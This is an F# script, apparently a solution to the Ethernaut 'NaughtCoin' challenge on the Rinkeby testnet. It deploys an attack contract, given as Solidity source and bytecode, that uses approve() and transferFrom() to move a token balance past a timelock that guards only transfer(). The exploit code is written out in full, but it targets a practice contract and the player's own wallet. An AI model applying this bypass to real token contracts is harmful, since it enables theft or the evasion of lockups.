#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.1" 

open web3.fs

// Values and partial applications
let env =createWeb3Environment "http://127.0.0.1:1248" "2.0" "0x2268b96e204379ee8366505c344ebe5cc34d3a46"

let call = makeEthCall env
let txn = makeEthTxn env

// use the webpage to deploy an instance, so that when we submit we get the blurb

// So, the contract as implemented overrides the ERC20 interface by adding its own timelock check on `transfer()'.
// However, `transfer()` isn't the only transfer function, and a 'pull' transfer can be accomplished after a suitable `approval()` call.
// This contract works after the user interacts with `approve()` on the instance contract.

(*
    contract ExtractCoin {

    address wallet = 0x2268B96E204379Ee8366505C344EBE5Cc34d3a46;

    function transferOut() public {
        NaughtCoin naught = NaughtCoin(0x7d53b2d74577E4C64a975096896d37e446dc5109);
        naught.transferFrom(wallet, address(this), 1000000000000000000000000);
    }
}
*)

// My instance: 0x7d53b2d74577E4C64a975096896d37e446dc5109 
let naughtABI = """[{"inputs":[{"internalType":"address","name":"_player","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"INITIAL_SUPPLY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"player","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"timeLock","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]""" |> ABI

let attackABI = """[{"inputs": [],"name": "transferOut","outputs": [],"stateMutability": "nonpayable","type": "function"}]""" |> ABI
let attackBytecode = """6080604052732268b96e204379ee8366505c344ebe5cc34d3a466000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b50610181806100746000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063c10f410b14610030575b600080fd5b61003861003a565b005b6000737d53b2d74577e4c64a975096896d37e446dc510990508073ffffffffffffffffffffffffffffffffffffffff166323b872dd60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff163069d3c21bcecceda10000006040518463ffffffff1660e01b8152600401808473ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050602060405180830381600087803b15801561010c57600080fd5b505af1158015610120573d6000803e3d6000fd5b505050506040513d602081101561013657600080fd5b8101908080519060200190929190505050505056fea26469706673582212200d7e041b39d14b271fbc57c913b425c5fa701a6325a9c717e372cc25225f060f64736f6c634300060c0033""" |> RawContractBytecode
prepareUndeployedContract env attackBytecode None RINKEBY attackABI 
|> Result.bind(deployEthContract env ZEROV)
|> env.log Log


// My attack contract: 0xad9571dbcce1560328756d83f0c0531c7d80f52b

let attack = loadDeployedContract env "0xad9571dbcce1560328756d83f0c0531c7d80f52b" RINKEBY attackABI |> bindDeployedContract |> List.head
let naught = loadDeployedContract env "0x7d53b2d74577E4C64a975096896d37e446dc5109" RINKEBY naughtABI |> bindDeployedContract |> List.head

// approve attacker for spend
txn naught (ByString "approve") [Address "0xad9571dbcce1560328756d83f0c0531c7d80f52b"; Uint256 "1000000000000000000000000"] ZEROV
|> env.log Log
// check the approval
call naught (ByString "allowance") [Address "0x2268b96e204379ee8366505c344ebe5cc34d3a46"; Address "0xad9571dbcce1560328756d83f0c0531c7d80f52b"]
|> env.log Log
// [+] Call result: [Uint256 "1000000000000000000000000"]

// Bypass timelock
txn attack (ByString "transferOut") [] ZEROV
|> env.log Log

// check contract's balance of token, and my balance
call naught (ByString "balanceOf") [Address "0xad9571dbcce1560328756d83f0c0531c7d80f52b"]
|> env.log Log

call naught (ByString "balanceOf") [Address "0x2268b96e204379ee8366505c344ebe5cc34d3a46"]
|> env.log Log
